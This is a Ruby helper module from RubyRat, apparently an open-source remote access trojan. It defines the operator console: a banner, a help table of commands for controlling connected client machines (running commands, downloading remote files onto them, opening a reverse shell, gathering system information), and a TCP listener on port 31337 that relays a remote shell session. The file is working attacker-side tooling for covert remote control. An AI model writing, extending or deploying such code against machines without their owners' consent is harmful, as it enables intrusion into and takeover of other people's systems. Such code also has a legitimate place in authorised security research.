##
# Useful helper functions
##

require 'colorize'
require 'terminal-table'

module RubyRat
  module Helpers
    def self.banner
      %Q{
    __________     ___.          __________         __
    \\______   \\__ _\\_ |__ ___.__.\\______   \\_____ _/  |_
     |       _/  |  \\ __ <   |  | |       _/\\__  \\\\   __\\
     |    |   \\  |  / \\_\\ \\___  | |    |   \\ / __ \\|  |
     |____|_  /____/|___  / ____| |____|_  /(____  /__|
            \\/          \\/\\/             \\/      \\/
              https://github.com/cbrnrd/RubyRat
    }.red
    end

    def self.help
      table = Terminal::Table.new do |t|
        t << ['Command', 'Action']
        t << :separator
        t.add_row ['General Actions', '']
        t.add_row ['client <id>', 'Connect to a client']
        t.add_row ['clients', 'List all connected clients']
        t.add_row ['quit', 'Exit the program and lose all clients']
        t.add_row ['history', 'Show command history']
        t.add_row ['clear', 'Clear the screen']
        #t.add_row ['build_client', 'Build an executable of the client (EXPERIMANTAL)']
        t << :separator
        t.add_row ['Client Actions', '']
        #t.add_row ['execute <command>', 'Execute the given command on the client']
        t.add_row ['sysinfo', 'Gather information about the client']
        t.add_row ['ls', 'Show all files in the current directory']
        t.add_row ['getpid', 'Show the sessions current pid']
        t.add_row ['wget <url>', 'Download a remote file on the client']
        t.add_row ['ifconfig', 'View network interface information']
        t.add_row ['pwd', 'Show the currend directory on the client']
        t.add_row ['execute', 'Execute a single command on the client']
        t.add_row ['shell', 'Open a reverse shell on the client']
        #t.add_row ['scan <host>', 'Perform a port scan on a host on the client network']
      end
    end

    def self.prompt(*args)
        print(*args)
        STDIN.gets
    end

    def self.listener(port=31337, ip=nil)
        # It is all in how we define our socket
        # Spawn a server or connect to one....
        if ip.nil?
          server = TCPServer.new(port)
          server.listen(1)
          @socket = server.accept
          puts 'Accepted'
        else
          @socket = TCPSocket.open(ip, port)
        end
        # Actual  Socket Handling
        while(true)
          if(IO.select([],[],[@socket, STDIN],0))
            socket.close
            return
          end
          begin
            while( (data = @socket.recv_nonblock(100)) != "")
              STDOUT.write(data);
            end
            break
          rescue Errno::EAGAIN
          end
          begin
            while( (data = STDIN.read_nonblock(100)) != "")
              @socket.write(data);
            end
            break
          rescue Errno::EAGAIN
          rescue EOFError
            break
          end
          IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
        end
      end

  end
end
